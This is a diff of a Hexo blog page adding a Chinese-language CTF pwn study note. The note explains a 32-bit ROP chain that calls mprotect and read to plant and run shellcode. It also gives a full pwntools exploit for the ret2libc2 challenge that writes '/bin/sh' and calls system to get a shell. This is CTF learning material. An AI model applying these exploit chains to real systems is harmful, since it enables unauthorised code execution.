+<p>这里重点看这部分<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>32位多参函数传参问题<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>仍然运用寄存器传参方法<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><br>payload_01 +&#x3D; p32(mprotect_addr)<br>payload_01 +&#x3D; p32(pop3_ret)<br>#执行完mprotect的返回地址,使esp往下+12<br>payload_01 +&#x3D; p32(mem_addr)<br>#mprotect函数参数1 修改的内存地址<br>payload_01 +&#x3D; p32(mem_size)<br>#mprotect函数参数2 修改的内存大小<br>payload_01 +&#x3D; p32(mem_proc)<br>#mprotect函数参数3 修改的权限<br>payload_01 +&#x3D; p32(read_addr)<br>#执行完上面pop3_ret后到read函数<br>payload_01 +&#x3D; p32(pop3_ret)<br>#执行完read后将返回到pop3_ret指令,又继续使esp+12到mem_addr<br>payload_01 +&#x3D; p32(0)<br>#read函数参数1 ,从输入端读取<br>payload_01 +&#x3D; p32(mem_addr)<br>#读取到的内容复制到指向的内存里<br>payload_01 +&#x3D; p32(0x100)<br>#读取大小<br>payload_01 +&#x3D; p32(mem_addr)<br>#这里就是shellcode了</p>
+<p>解释<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>    1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>栈溢出到eip<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将mprotect函数地址传入eip中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>为main函数返回地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span><br>    2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>后面跟着pop3_addr作为mprotect函数返回地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>在mprotect函数执行完之后进行返回<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span><br>    3<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>后面跟着三个mprotect函数的参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>进行修改<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span><br>    4<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>过程<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>在输入完三个参数之后<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将pop3作为返回地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>把参数跳过<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>也就是弄走<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>32位程序利用栈进行传参<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>函数之中完成mpro<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>函数的调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>    利用pop3_addr最后的ret指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将sp指针上移<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>    从而使得ip往上走<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>函数调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>跳过参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><br>    这里插入下汇编ret指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>![[default 1.jfif]]<br>    具体含义是将sp向栈的上上方移并将上面的一个地址读入栈中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>    5<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>下面的read函数由于ret指令则被调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><br>    6<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>最后跟着shell的写入地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>进行shell的调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></p>
+<p><span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>补充下与ret2libc2的区别<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><br>其exp:<br>from pwn import *</p>
+<p>sh &#x3D; process(‘.&#x2F;ret2libc2’)</p>
+<p>system_addr&#x3D;0x8048490</p>
+<p>gets_addr&#x3D;0x8048460</p>
+<p>pop_addr &#x3D; 0x0804872f</p>
+<p>buf2_addr &#x3D; 0x804a080</p>
+<p>payload &#x3D; flat([112*A, gets_addr, pop_addr, buf2_addr, system_addr, 0xdeadbeef, buf2_addr])</p>
+<p>sh.sendline(payload)</p>
+<p>sh.sendline(‘&#x2F;bin&#x2F;sh’)</p>
+<p>sh.interactive()<br>其运用的是先构造好rop链<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>最后往里面写参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br>调用gets函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将参数跳过<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>后面写sys的地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>参数<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>所在地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><br>之后写入&#x2F;bin&#x2F;sh即可<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>最后写的地址是参数写入的地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></p>
+<p>这道题是shellcode执行地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-是的是我的第一个博客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="2023/04/08/%E6%98%AF%E7%9A%84%E6%98%AF%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/" class="article-date">
@@ -72,8 +276,6 @@
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/tags/" rel="tag">tags</a></li></ul>
-
     </footer>
   </div>
   
@@ -82,9 +284,9 @@
 
 
   
-    <article id="post-CG" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post------------------------CTF-PWN-----------------------" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="2023/04/08/CG/" class="article-date">
+    <a href="2023/04/08/-----------------------CTF-PWN-----------------------/" class="article-date">
   <time class="dt-published" datetime="2023-04-07T19:25:00.000Z" itemprop="datePublished">2023-04-08</time>
 </a>
     
@@ -96,7 +298,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="2023/04/08/CG/">CG</a>
+      <a class="p-name article-title" href="2023/04/08/-----------------------CTF-PWN-----------------------/">CTF-PWN</a>
     </h1>
   
 
@@ -148,61 +350,6 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="2023/04/08/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2023-04-07T18:44:38.314Z" itemprop="datePublished">2023-04-08</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="categories/CG/">CG</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="2023/04/08/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
       
     </div>
     <footer class="article-footer">
